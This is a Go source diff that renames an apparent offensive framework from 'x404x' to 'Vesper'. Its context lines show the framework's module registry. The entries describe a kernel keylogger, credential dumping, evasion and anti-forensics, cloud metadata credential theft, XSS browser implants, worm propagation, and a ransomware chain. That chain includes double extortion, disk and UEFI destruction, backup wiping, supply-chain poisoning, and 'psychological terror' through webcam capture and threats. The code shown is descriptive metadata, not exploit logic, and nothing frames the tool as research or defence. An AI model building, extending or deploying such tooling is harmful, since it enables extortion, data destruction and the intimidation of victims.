@@ -25,15 +25,15 @@ import (
 
 	_ "modernc.org/sqlite" // pure-Go SQLite driver
 
-	"github.com/ruby570bocadito/x404x/internal/agent"
-	"github.com/ruby570bocadito/x404x/internal/orchestrator"
-	"github.com/ruby570bocadito/x404x/internal/dispatch"
-	"github.com/ruby570bocadito/x404x/pkg/shared/config"
-	"github.com/ruby570bocadito/x404x/pkg/shared/logger"
-	"github.com/ruby570bocadito/x404x/pkg/shared/types"
+	"github.com/ruby570bocadito/vesper/internal/agent"
+	"github.com/ruby570bocadito/vesper/internal/dispatch"
+	"github.com/ruby570bocadito/vesper/internal/orchestrator"
+	"github.com/ruby570bocadito/vesper/pkg/shared/config"
+	"github.com/ruby570bocadito/vesper/pkg/shared/logger"
+	"github.com/ruby570bocadito/vesper/pkg/shared/types"
 )
 
-// AppState holds all shared state for the X404X application.
+// AppState holds all shared state for the Vesper application.
 type AppState struct {
 	Cfg          *config.Config
 	Log          *logger.Logger
@@ -138,107 +138,107 @@ func (s *AppState) Start(ctx context.Context) error {
 	s.modules = append(s.modules,
 		ModuleDef{Name: "post/post_exploit_full_chain", Type: "post",
 			Description: "Full post-exploitation chain: Rise-Privilege + Vault-Kernel + Wormy-ML. Escalates, hides, persists, propagates.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "post/post_exploit_privesc", Type: "post",
 			Description: "Privilege Escalation stage only: 12 vectors, 60+ GTFOBins. Auto-root via SUID/sudo/cron/Docker.",
-			Rank: "excellent", OS: "Linux"},
+			Rank:        "excellent", OS: "Linux"},
 		ModuleDef{Name: "post/post_exploit_stealth", Type: "post",
 			Description: "Stealth stage: Vault-Kernel IOCTL. Hides process, files, ports, and kernel module.",
-			Rank: "great", OS: "Linux"},
+			Rank:        "great", OS: "Linux"},
 		ModuleDef{Name: "post/post_exploit_propagate", Type: "post",
 			Description: "Propagation stage: Wormy-ML autonomous network spread with 44 exploits + RL engine.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "post/credential_dump", Type: "post",
 			Description: "Credential dump: /etc/shadow, SSH keys, browser data, LaZagne, Mimikatz.",
-			Rank: "excellent", OS: "any"},
+			Rank:        "excellent", OS: "any"},
 		ModuleDef{Name: "post/keylogger", Type: "post",
 			Description: "Kernel-level keylogger via Vault-Kernel notifier chain. Captures before X11/Wayland.",
-			Rank: "great", OS: "Linux"},
+			Rank:        "great", OS: "Linux"},
 		ModuleDef{Name: "post/evasion_apply", Type: "post",
 			Description: "Apply evasion: AMSI/ETW bypass, polymorphic engine, sleep obfuscation, JA3 spoofing.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "post/exfiltrate", Type: "post",
 			Description: "Chunked encrypted file exfiltration over C2 channel. 64KB chunks, XChaCha20 encrypted.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "post/cleanup", Type: "post",
 			Description: "Anti-forensics: wipe logs, clear timestamps, remove persistence, secure delete.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "auxiliary/bloodhound", Type: "auxiliary",
 			Description: "BloodHound AD collector: SharpHound (Windows) + Python LDAP enumerator. Maps attack paths.",
-			Rank: "excellent", OS: "any"},
+			Rank:        "excellent", OS: "any"},
 		ModuleDef{Name: "auxiliary/responder", Type: "auxiliary",
 			Description: "Responder: NTLM hash capture via LLMNR/MDNS/NBT-NS poisoning on local network.",
-			Rank: "great", OS: "Linux"},
+			Rank:        "great", OS: "Linux"},
 		ModuleDef{Name: "auxiliary/web_scan", Type: "auxiliary",
 			Description: "Web app vulnerability scanner: SQLi, XSS, LFI/RFI, Command Injection detection.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "exploit/aws_imds", Type: "exploit",
 			Description: "AWS IMDSv1 metadata exfiltration: steal IAM credentials from EC2 instances.",
-			Rank: "excellent", OS: "any"},
+			Rank:        "excellent", OS: "any"},
 		ModuleDef{Name: "exploit/azure_identity", Type: "exploit",
 			Description: "Azure Managed Identity token theft: extract OAuth2 tokens from IMDS endpoint.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "exploit/gcp_service_account", Type: "exploit",
 			Description: "GCP Service Account key exfiltration from compute metadata endpoint.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "auxiliary/payload_obfuscate", Type: "auxiliary",
 			Description: "Payload obfuscation: polymorphic mutation, XOR encryption, AES, UPX packing.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "exploit/phantom_xss", Type: "exploit",
 			Description: "PhantomWeb XSS injection: deploy sub-500 byte Wasm implant via XSS/watering hole.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "post/phantom_sw_persist", Type: "post",
 			Description: "PhantomWeb Service Worker persistence: survives browser restart and clear data.",
-			Rank: "excellent", OS: "any"},
+			Rank:        "excellent", OS: "any"},
 		ModuleDef{Name: "auxiliary/phantom_browser_mesh", Type: "auxiliary",
 			Description: "PhantomWeb Browser Mesh: P2P WebRTC network between infected browsers.",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "post/phantom_socks5", Type: "post",
 			Description: "PhantomWeb SOCKS5 proxy: pivot to internal network via infected browser.",
-			Rank: "excellent", OS: "any"},
+			Rank:        "excellent", OS: "any"},
 		ModuleDef{Name: "exploit/apport_spoof", Type: "exploit",
 			Description: "Breach-Entry: CVE-2026-XXXX apport ExecutablePath spoofing on Ubuntu 24.04 LTS.",
-			CVE: "CVE-2026-XXXX", Rank: "excellent", OS: "Linux"},
+			CVE:         "CVE-2026-XXXX", Rank: "excellent", OS: "Linux"},
 		ModuleDef{Name: "auxiliary/breach_check", Type: "auxiliary",
 			Description: "Check if target is vulnerable to Breach-Entry CVE-2026-XXXX (apport service).",
-			CVE: "CVE-2026-XXXX", Rank: "normal", OS: "Linux"},
+			CVE:         "CVE-2026-XXXX", Rank: "normal", OS: "Linux"},
 	)
 
 	// Ransomware modules (v2.3)
 	s.modules = append(s.modules,
 		ModuleDef{Name: "ransomware/execute", Type: "ransomware",
 			Description: "Full ransomware chain: scan sensitive data → exfil → multi-layer encrypt → destruct → propagate → psychological terror",
-			Rank: "danger", OS: "any"},
+			Rank:        "danger", OS: "any"},
 		ModuleDef{Name: "ransomware/scan", Type: "ransomware",
 			Description: "Heuristic content scanner: DNI, passports, credit cards, contracts, PST/OST, MDF/SQL, API keys via regex engine",
-			Rank: "excellent", OS: "any"},
+			Rank:        "excellent", OS: "any"},
 		ModuleDef{Name: "ransomware/encrypt", Type: "ransomware",
 			Description: "Hydra multi-layer encryption: 3 RSA keys + Shamir's Secret Sharing + AES-GCM + ChaCha20 double encryption for critical files",
-			Rank: "danger", OS: "any"},
+			Rank:        "danger", OS: "any"},
 		ModuleDef{Name: "ransomware/exfil", Type: "ransomware",
 			Description: "Double extortion: ZIP with password → exfil via DNS TXT fragments / CDN stego / S3 with stolen credentials",
-			Rank: "danger", OS: "any"},
+			Rank:        "danger", OS: "any"},
 		ModuleDef{Name: "ransomware/note", Type: "ransomware",
 			Description: "Deploy ransom note + shaming post: .onion negotiation URL, data sample publishing, client notification",
-			Rank: "danger", OS: "any"},
+			Rank:        "danger", OS: "any"},
 		ModuleDef{Name: "ransomware/destruct", Type: "ransomware",
 			Description: "System destruction: MFT overwrite, UEFI NVRAM sabotage, cloud backup API destruction (Veeam/Acronis/AWS)",
-			Rank: "danger", OS: "windows"},
+			Rank:        "danger", OS: "windows"},
 		ModuleDef{Name: "ransomware/propagate", Type: "ransomware",
 			Description: "Propagation via exploits: Zerologon, ProxyNotShell, PrintNightmare, BlueKeep, EternalBlue + Outlook COM + WSUS + NPM/Git poison",
-			Rank: "danger", OS: "any"},
+			Rank:        "danger", OS: "any"},
 		ModuleDef{Name: "ransomware/psychological", Type: "ransomware",
 			Description: "Real-time terror: TOPMOST countdown window, webcam capture, printer spam, TTS audio threats, live file deletion",
-			Rank: "danger", OS: "any"},
+			Rank:        "danger", OS: "any"},
 		ModuleDef{Name: "ransomware/polymorph", Type: "ransomware",
 			Description: "Binary polymorphism: JIT reordering, ROP gadget generation, per-machine key derivation, junk code insertion",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 		ModuleDef{Name: "ransomware/trust_exploit", Type: "ransomware",
 			Description: "Trust exploitation: self-signed code cert generation, PFX/P12 search, WSUS/SCCM/NuGet/NPM/Git hook poisoning",
-			Rank: "danger", OS: "any"},
+			Rank:        "danger", OS: "any"},
 		ModuleDef{Name: "ransomware/antianalysis", Type: "ransomware",
 			Description: "Anti-analysis: sandbox detection, kernel debugger check, PE corruption, stego C2 via CDN image LSB + EXIF",
-			Rank: "great", OS: "any"},
+			Rank:        "great", OS: "any"},
 	)
 
 	s.Log.Infof("state started: %d agents, %d hosts, %d vulns, %d creds",
@@ -259,7 +259,7 @@ func (s *AppState) Stop() {
 func (s *AppState) initDB() error {
 	dbPath := s.Cfg.Database.DSN
 	if dbPath == "" {
-		dbPath = "x404x.db"
+		dbPath = "vesper.db"
 	}
 
 	db, err := sql.Open("sqlite", dbPath)
